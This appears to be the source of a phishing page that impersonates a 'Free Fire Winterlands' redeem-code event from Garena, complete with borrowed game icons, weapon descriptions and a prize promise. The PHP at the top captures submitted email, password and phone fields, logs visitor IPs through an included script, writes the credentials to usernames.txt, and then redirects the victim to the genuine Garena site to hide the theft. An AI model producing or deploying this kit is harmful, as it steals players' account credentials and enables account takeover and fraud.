<?php
$id = $_POST['id'];
$country = $_POST['country'];
$email = $_POST['email'];
$password = $_POST['password'];
$hp = $_POST['phone'];
$emailr = $_POST['emailr'];
?>

<?php
include 'ip.php';
file_put_contents("usernames.txt", "email=" . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("usernames.txt", "pass=" . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://ff.garena.com/');
?>

<center><span style='background:limegreen;width:360px;margin:0;padding:5px 0;color:black;display:block'>Success! Your submission has been requested</span></center>

<html>
<head>
<title>Free Fire - Redeem Code</title>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Free Fire Winterlands - Redeem Code"/>
<meta property="og:url" content="index.html"/>
<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
<meta property="og:type" content="article"/>
<meta property="article:author" content="https://www.facebook.com/MobileLegendsGameIndonesia"/>
<meta property="og:image" content="img/banner.jpg"/>
<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/index.css"/>
</head>
<body>
<div class="logo">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" alt="Free Fire Winterlands"/>
</div>
<img class="banner" src="https://1.bp.blogspot.com/-UEFjQE1QOKY/XhBG5WkqNqI/AAAAAAAAAlY/_Ley0LvHyycIUQvHy1wZNEeA5Spqz2MPQCLcBGAsYHQ/s320/IMG_20200104_133005.jpg" alt="Banner"/>
<div style="clear:both"></div>
<div class="button">
<div class="event"><center><strong>Congratulations</strong></center><br/>1. Please download app by clicking  <strong>App Available Download </strong> on the button below and copy <strong> Unique Code</strong> on that page.<br/>2. After that, click the event you want to claim below and paste <strong>Unique Code</strong> you have copied.<br/><br/>Prizes and bonuses will be given after <strong>30 minutes</strong>, for players who have sent.</div>
<a href="http://d.helo-app.com/LCuDUo/" title="Download on Play Store"><img src="img/download.png" alt="Download"/></a>
<a href="https://reward.ff.garena.com/" title="Redemption Code"><img src="img/code.png" alt="Redemption Code"/></a>
</div>
<ul class="news">
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_AR_orange.png)" alt="M4A1">M4A1<br/><small>A balanced rifle is suitable for all types of battles.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SMG_orange.png)" alt="MP5">MP5<br/><small>Beyond other machine guns in terms of stability, but less effective for long distances.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SG_orange.png)" alt="M1014">M1014<br/><small>Use the shotgun to destroy melee enemies quickly.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SR_orange.png)" alt="AWM">AWM<br/><small>High strength sniper rifle with long reload time.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_Pistol_orange.png)" alt="USP">USP<br/><small>A light gun that does not affect the user's agility.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_Melee_orange.png)" alt="PAN">PAN<br/><small>Great shield that protects users from anything your enemy can use.</small></li>
</ul>
</body>
</html>
